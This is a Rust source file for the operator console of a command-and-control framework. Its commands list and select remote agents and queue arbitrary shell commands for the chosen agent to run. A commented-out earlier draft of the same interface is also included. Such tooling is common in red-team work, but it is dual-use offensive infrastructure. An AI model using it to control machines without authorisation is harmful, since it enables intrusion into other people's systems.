use std::io::{self, Write};
use std::sync::Arc;
use tokio::sync::Mutex;
use shell_words;

use crate::core::c2::C2;
use crate::tasking::agent_command::AgentCommand;
use crate::tasking::tasking::Task;
use crate::Logging;

pub struct C2Cli {
    pub current_agent: u64,
}

impl C2Cli {
    pub async fn run(&mut self, c2: Arc<Mutex<C2>>) {

        println!("=== Welcome to the C2 Command Interface ===\n\n");

        loop {
            if self.current_agent != 0 {
                print!("c2[{}]>", self.current_agent);
            } 
            print!("c2>");
            
            io::stdout().flush().unwrap();

            let mut input = String::new();
            if io::stdin().read_line(&mut input).is_err() {
                eprintln!("Failed to read input.");
                continue;
            }


            let parsed = match shell_words::split(input.trim()) {
                Ok(p) => p,
                Err(e) => {
                    eprint!("Error parsing input {}", e);
                    continue;
                }
            };

            let mut parts = parsed.into_iter();
            let cmd = parts.next();

            match cmd.as_deref() {
                Some("list") => {
                    let c2 = c2.lock().await;
                    c2.list_agents().await;
                    // TODO: fix formatting to be in column format
                }
                Some("exit") | Some("quit") => {
                    println!("Exiting C2 CLI.");
                    break;
                }
                Some("help") => {
                    println!("Available: list, exit, show, remove, use, home, send");
                }
                Some("show") => {
                    match parts.next() {
                        Some(id_str) => match id_str.parse::<u64>() {
                            Ok(id) => {
                                let c2 = c2.lock().await;
                                if c2.agent_exists(id).await {
                                    c2.list_agent(id).await;
                                } else {
                                    println!("Invalid agent ID: {}", id);
                                }
                            }
                            Err(_) => println!("Invalid agent ID: {}", id_str),
                        },
                        None => println!("Usage: show <agent_id>"),
                    }
                }
                Some("remove") => {
                    match parts.next() {
                        Some(id_str) => match id_str.parse::<u64>() {
                            Ok(id) => {
                                if self.current_agent != id {
                                    let mut c2 = c2.lock().await;
                                    if c2.agent_exists(id).await {
                                        c2.remove_agent(id).await;
                                    } else {println!("Invalid agent ID: {}", id);}
                                } else {println!("You cannot remove the currently selected agent.");}
                            }
                            Err(_) => println!("Invalid agent ID: {}", id_str)
                        }
                        None => println!("Usage: remove <agent_id>")
                    }
                }
                Some("home") => {
                    self.current_agent = 0;
                }
                Some("use") => {
                    match parts.next() {
                        Some(id_str) => match id_str.parse::<u64>() {
                            Ok(id) => {
                                let c2 = c2.lock().await;
                                if c2.agent_exists(id).await {
                                    self.current_agent = id;
                                } else {println!("Invalid agent ID: {}", id);}
                            }
                            Err(_) => println!("Invalid agent ID: {}", id_str),
                        },
                        None => println!("Usage: use <agent_id>"),
                    }
                }
                Some("send") => {
                    if self.current_agent == 0 {
                        println!("Select an Agent to use");
                        continue;
                    }
                    match parts.next().as_deref() {
                        Some("command") => {
                            if parts.clone().count() == 0 {
                                println!("Usage: send command <shell command>");
                                continue;
                            }
                            let task = parts.collect::<Vec<String>>().join(" ");
                            dbg!(&task);
                            let c2 = c2.lock().await;
                            c2.create_task(self.current_agent, 
                                Task {
                                    command: AgentCommand::RunShell(task),
                                    dispatched: false
                                }
                            ).await;
                            
                        }

                        Some(other) => {
                            println!("Unknown send subcommand: '{}'", other);
                        }
                        None => {
                            println!("Usage: send command <command>");
                        }
                    }
                }
                
                Some(other) => {println!("Unknown command: '{}'", other);}
                None => {}
            }


            // let command = input.trim();
            // let mut parts = command.split_whitespace();
            // let cmd = parts.next();

            // match cmd {
            //     Some("list") => {
            //         let c2 = c2.lock().await;
            //         c2.list_agents().await;
            //         // TODO: fix formatting to be in column format
            //     }
            //     Some("exit") | Some("quit") => {
            //         println!("Exiting C2 CLI.");
            //         break;
            //     }
            //     Some("help") => {
            //         println!("Available: list, exit, show, remove, use, home");
            //     }
            //     Some("show") => {
            //         if let Some(id_str) = parts.next() {
            //             if let Ok(id) = id_str.parse::<u64>(){
            //                 let c2 = c2.lock().await;
            //                 if c2.agent_exists(id).await {
            //                     c2.list_agent(id).await;
            //                 } else {
            //                     println!("Invalid agent ID: {}", id);
            //                 }
            //             } else {
            //                 println!("Invalid agent ID: {}", id_str);
            //             }
            //         } else {
            //             println!("Usage: show <agent_id>");
            //         }
            //     }
            //     Some("remove") => {
            //         if let Some(id_str) = parts.next() {
            //             if let Ok(id) = id_str.parse::<u64>(){
            //                 let mut c2 = c2.lock().await;
            //                 if self.current_agent != id && c2.agent_exists(id).await {
            //                     c2.remove_agent(id).await;
            //                 } else {
            //                     println!("Invalid agent ID: {}", id);
            //                 }
            //             } else {
            //                 println!("Invalid agent ID: {}", id_str);
            //             }
            //         } else {
            //             println!("Usage: show <agent_id>");
            //         }
            //     }
            //     Some("use") => {
            //         if let Some(id_str) = parts.next() {
            //             if let Ok(id) = id_str.parse::<u64>(){
            //                 let c2 = c2.lock().await;
            //                 if c2.agent_exists(id).await {
            //                     self.current_agent = id;
            //                 } else {
            //                     println!("Invalid agent ID: {}", id);
            //                 }
            //             } else {
            //                 println!("Invalid agent ID: {}", id_str);
            //             }
            //         } else {
            //             println!("Usage: show <agent_id>");
            //         }
            //     }
            //     Some("home") => {
            //         self.current_agent = 0;
            //     }
            //     Some("send") => {
            //         // Check if using an Agent
            //         if self.current_agent == 0 {
            //             println!("Select an Agent to use");
            //             continue;
            //         }
            //         Logging::DEBUG.print_message("Not implemented");
            //         // command to run
            //         // NEED TO USE shell-words for parsing here
            //         // Use C2 TaskManager queue to add task for current_agent
            //     }
            //     _ => {
            //         println!("Unknown command: '{}'", command);
            //     }
            // }
        }
    }
}

pub fn _interface() {
    loop {
        print!("> ");
        // Flush to ensure prompt appears immediately
        std::io::stdout().flush().expect("Failed to flush stdout");

        let mut input = String::new();
        match std::io::stdin().read_line(&mut input) {
            Ok(_) => {
                let trimmed = input.trim();
                if trimmed.eq_ignore_ascii_case("exit") || trimmed.eq_ignore_ascii_case("quit") {
                    println!("Exiting...");
                    break;
                }
                println!("You said: {}", trimmed);
            }
            Err(e) => {
                eprintln!("Error reading input: {}", e);
            }
        }
    }
}


#[cfg(test)]
mod tests {

    #[test]
    fn tests_interface() {
    }
}